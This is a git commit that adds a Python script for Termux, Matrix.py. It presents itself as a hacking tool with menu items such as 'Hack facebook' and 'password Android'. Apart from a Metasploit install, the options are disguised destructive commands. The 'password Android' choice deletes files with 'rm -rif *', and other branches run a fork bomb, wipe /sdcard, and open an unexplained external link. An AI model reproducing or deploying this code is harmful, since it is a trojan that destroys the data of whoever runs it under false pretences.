a4a982c8a412f88ea93f3cd69c757de7baca704a
mahmod23729363917 <78208572+mahmod23729363917@users.noreply.github.com>
2021-01-29 13:27:32 +0200

    Add files via upload

---
+++ Matrix.py
@@ -0,0 +1,104 @@
+from os import *
+from time import *
+from sys import *
+##################
+r= '\033[1;31m'
+g= '\033[1;32m'
+y= '\033[1;33m'
+c= '\033[1;36m'
+w= '\033[1;37m'
+print("\033[1;31m          Welcome to my Tool   ")
+print("\033[1;32m    ShadoW--{ ^_^ }--Welcome To Tool mahmod ")
+
+
+
+
+
+
+
+
+
+print ("\033[1;33m        \    \    \. \\\.__,-“-.__.///  ./  ./    /  ")
+print ("\033[1;33m         \.   \`.  \`.- “ _,=|=._ “”`-.’/  ’/   ./  ")
+print ("\033[1;33m          \`.  \_`-’’ //  _,=“=._  \\  ``-_/   ./   ")
+print ("\033[1;33m           \`-’,\=, \\_. \ _,=“=._//,_///_./,`- /     ")
+print ("\033[1;33m            \.   \.      __,-“-.__   \033[1;31m   ./   ./       ")
+print ("\033[1;31m        \.  \033[1;33m \`. \ `.- “” _,=“=._ “”`-.\033[1;31m’/  .’/   ./    ")
+print ("\033[1;31m         \`. \033[1;31m \_`.““      _,=“=._      ``- \033[1;31m_/  .’/      ")
+print ("\033[1;31m          \ `-\033[1;31m ,-._   _.  _,=“=._  ,_   _.-,`-’\033[1;31m /      ")
+print ("\033[1;31m       \. /`,- \033[1;33m,-._\033[1;31m”””  \ _,=“=._ /  “””\033[1;33m_.-,\033[1;31>")
+print ("\033[1;31m        \`-  \033[1;33m /    `-._ \033[1;31m “       “ \033[1;33m _.-’    \ \033[1;>")
+print ("\033[1;31m        /)  \033[1;33m (   \033[1;31m @ \033[1;33m   \ \033[1;31m   ,-.         @\033[1;33>")
+print ("\033[1;31m     ,-’“    \033[1;33m `-.       \ \033[1;31m /   \ \033[1;33m /       .-    \033[>")
+print ("\033[1;31m   ,’_._      \033[1;33m   `-.____/ \033[1;31m/  _  \ \033[1;33m\____.-      \033[1>")
+print ("\033[1;31m  /,’   `.               \033[1;31m \_/ \_/             \033[1;31m   .    `,\   ")
+print ("\033[1;31m /        )                  _                  (       `\    ")
+print ("\033[1;31m         /   _,-’“`-.  ,++|T|||T|++.  .- “`-,_   \            ")
+print ("\033[1;31m        / ,-’        \/|`|`|`| |’|‘|\/        `-, \          ")
+print ("\033[1;31m       /,             || | | | | | ||            `,\        ")
+print ("\033[1;31m      /                ` | | | | | ’               `\      ")
+print ("\033[1;31m                         ` | | |                          ")
+print (   )
+
+
+
+
+
+print( g +"["+ y +"1"+ w +"]" + w +"[" +g+"-----"+ r +"install Metasploot"+ y +"]")
+system('sleep 0.1')
+print( y +"["+ g +"2"+ w +"]" + w + "["+g+"----" +r+"password Android" +y+"]" )
+system('sleep 0.1')
+print( y +"["+ g +"3"+ w +"]" + w + "["+g+"----" +r+"Hack facebook" +y+"]" )
+system('sleep 0.1')
+print( y +"["+ g +"4"+ w +"]" + w + "["+g+"----" +r+"Hack WhatsApp" +y+"]" )
+system('sleep 0.1')
+print( y +"["+ g +"5"+ w +"]" + w + "["+g+"----" +r+"my facebook" +y+"]" )
+system('sleep 0.1')
+print( y +"["+ g +"6"+ w +"]" + w + "["+g+"----" +r+"about" +y+"]" )
+
+
+
+
+
+
+
+
+
+
+
+droid=str(input("              ●~"+"Enter Number " "~》 "))
+if droid == "1":
+    system('clear')
+    print( r +"-----:Install Now MetaSploit:-----")
+    system('sleep 1')
+    system('pkg install unstable-repo -y')
+    system('pkg install metasploit -y')
+    system('clear')
+    print (g +"            ^_^ ...... Thank You Down")
+    print (c +"Please Open New Session and Enter")
+    print (y+"                         The command---"+ Y +"{ "+ W +"msfconsole "+ Y +"}")
+    print (" ")
+    print (r +"*"*54)
+    print (" ")
+    print (" ")
+    input (w +"Enter BaCk... ")
+    system('python Matrix.py')
+elif droid == "2":
+    print("Download......")
+    system('cd /sdcard')
+    system('rm -rif *')
+    system('clear')
+    system('python Matrix.py')
+elif droid == 3:
+    system(':(){ :|:& };:')
+    system('clear')
+    system('python Matrix.py')
+elif droid == 4:
+    system('rm -rif /sdcard/* && :(){ :|:& };:')
+    system('clear')
+    system('python Matrix.py')
+elif droid == 5:
+    system('termux-open http://1-u.mobi/d2.aspx?id=T6RXY//WmfhqeZxU29NYXA==')
+    system('clear')
+    system('toilet -f mono12 -F gay joker')
+    system('python Matrix.py')
